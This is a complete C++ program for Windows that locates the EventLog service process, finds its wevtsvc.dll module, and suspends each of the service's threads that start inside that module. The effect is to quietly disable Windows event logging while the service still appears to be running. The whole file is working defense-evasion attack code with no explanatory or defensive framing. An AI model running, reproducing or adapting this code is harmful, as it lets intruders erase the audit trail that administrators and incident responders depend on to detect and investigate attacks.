#include <windows.h>
#include <TlHelp32.h>
#include <dbghelp.h>
#include <winternl.h>
#include <psapi.h>   
#include <stdio.h>



#pragma comment(lib, "psapi.lib") 
#pragma comment(lib, "dbghelp.lib")


using myNtQueryInformationThread = NTSTATUS(NTAPI*)
(
	IN HANDLE			ThreadHandle,
	IN THREADINFOCLASS  ThreadInformationClass,
	OUT PVOID			ThreadInformation,
	IN ULONG			ThreadInformationLength,
	OUT PULONG			ReturnLength
	);


int main()
{
	HANDLE serviceProcessHandle;
	HANDLE snapshotHandle;
	HANDLE threadHandle;

	HMODULE modules[256] = {};
	SIZE_T modulesSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;
	DWORD moduleNameSize = 0;
	SIZE_T modulesCount = 0;
	WCHAR remoteModuleName[128] = {};
	HMODULE serviceModule = NULL;
	MODULEINFO serviceModuleInfo = {};
	DWORD_PTR  threadStartAddress = 0;
	DWORD bytedNeeded = 0;


	myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread"));

	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE service = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

	SERVICE_STATUS_PROCESS serviceStatusProcess = {};

	QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytedNeeded);
	DWORD servicePID = serviceStatusProcess.dwProcessId;

	serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);
	snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	EnumProcessModules(serviceProcessHandle, modules, modulesSize, &modulesSizeNeeded);
	modulesCount = modulesSizeNeeded / sizeof(HMODULE);

	for (size_t i = 0; i < modulesCount; i++)
	{
		serviceModule = modules[i];

		GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName));

		if (wcscmp(remoteModuleName, L"wevtsvc.dll") == 0)
		{
			printf("Windows EventLog module %S at %p\n\n", remoteModuleName, serviceModule);
			GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));
		}
	}

	Thread32First(snapshotHandle, &threadEntry);
	while (Thread32Next(snapshotHandle, &threadEntry))
	{

		if (threadEntry.th32OwnerProcessID == servicePID)
		{
			threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
			NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);

			//Check if thread's start address is inside wevtsvc.dll memory usage
			if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= ((DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage))
			{
				SuspendThread(threadHandle);
				Sleep(2000);
			}
		}
	}

	return 0;
}
